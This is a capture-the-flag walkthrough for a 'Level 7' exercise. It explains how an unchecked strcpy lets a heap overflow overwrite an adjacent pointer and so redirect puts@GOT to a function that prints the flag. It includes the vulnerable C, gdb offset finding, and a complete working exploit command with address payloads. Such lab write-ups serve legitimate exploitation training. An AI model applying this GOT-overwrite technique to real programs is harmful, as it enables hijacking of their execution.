# Level 7 — Heap Overflow + GOT Overwrite

## 1. Goal

Redirect execution so that:

```
puts() → m()
```

This will print the flag.

---

## 2. Key Addresses

```
puts@GOT = 0x08049928
m()       = 0x080484f4
```

---

## 3. Program Behavior (Simplified)

```c
A = malloc(8);
A->ptr = malloc(8);

B = malloc(8);
B->ptr = malloc(8);

strcpy(A->ptr, argv[1]);   // vulnerable
strcpy(B->ptr, argv[2]);   // used later

puts(...);                 // target
```

---

## 4. Vulnerability

```
strcpy(A->ptr, argv[1])
```

* No size check
* Overflow A->ptr
* Overwrites nearby memory → including `B->ptr`

---

## 5. Exploit Idea

### Step 1

Overflow and modify:

```
B->ptr → puts@GOT
```

### Step 2

Second strcpy becomes:

```
strcpy(puts@GOT, argv[2])
```

### Step 3

Write address of `m` into GOT:

```
puts@GOT = m
```

---

## 6. Offset (Finding the Overflow)

We use a cyclic pattern to detect where the overflow happens:

```bash
(gdb) run AAA...
Program received signal SIGSEGV
(gdb) info registers $eax
eax            0x37614136    929120566
```

The value `0x37614136` comes from our pattern.

Using a pattern tool (or /level2/Ressources/ressources.txt):

```
0x37614136 → offset = 20 bytes
```

This means after **20 bytes**, we start overwriting the next structure (`B->ptr`).

---

## 7. Payload

### First argument (overflow)

```bash
python -c "print 20 * 'A' + '\x08\x04\x99\x28'[::-1]"
```

### Second argument (what to write)

```bash
python -c "print '\x08\x04\x84\xf4'[::-1]"
```

---

## 8. Execution

```bash
./level7 \
$(python -c "print 20 * 'A' + '\x08\x04\x99\x28'[::-1]") \
$(python -c "print '\x08\x04\x84\xf4'[::-1]")
```

---

## 9. What Happens Internally

1. First strcpy → overwrite `B->ptr`
2. Second strcpy → write into `puts@GOT`
3. GOT entry changed → `puts → m`
4. Program calls puts → actually calls `m`

---

## 10. Result

```
Flag is printed
```

---

## 11. Key Takeaways

* Heap overflow can modify **adjacent structures**
* Overwriting a pointer → powerful primitive
* GOT overwrite = control program execution

---
